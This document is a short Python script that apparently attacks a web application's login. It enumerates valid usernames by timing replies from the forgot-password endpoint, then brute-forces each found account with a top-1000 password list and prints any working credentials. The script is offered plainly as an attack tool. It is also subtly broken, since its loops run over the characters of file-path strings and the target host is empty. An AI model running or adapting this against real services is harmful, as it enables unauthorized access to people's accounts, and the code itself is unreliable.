import requests
import time

host = ""
login_url = host + "/app/auth/login"
forgot_url = host + "/app/auth/forgot"

users = "C://Users//Administrator//Desktop//username1000.txt"

heads = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/json",
}

live_users = []
for u in users:
    try:
        t1 = time.time()
        r = requests.post(forgot_url, json={"account": u}, headers=heads, timeout=5)
        t2 = time.time()
        if t2 - t1 > 1.5:
            live_users.append(u)
            print("user exists: " + u + " (resp:" + str(round(t2-t1, 2)) + "s)")
    except:
        pass

passwords = "C://Users//Administrator//Desktop//passwordtop1000.txt"

for u in live_users:
    for p in passwords:
        try:
            data = '{"account":"' + u + '","password":"' + p + '","remember":false}'
            r = requests.post(login_url, data=data, headers=heads, timeout=5)
            if "/dashboard" in r.text or r.status_code == 200 and "\"code\":0" in r.text:
                print("login: " + u + " / " + p)
            if r.status_code == 302:
                print("redirect login: " + u + " / " + p)
        except:
            pass
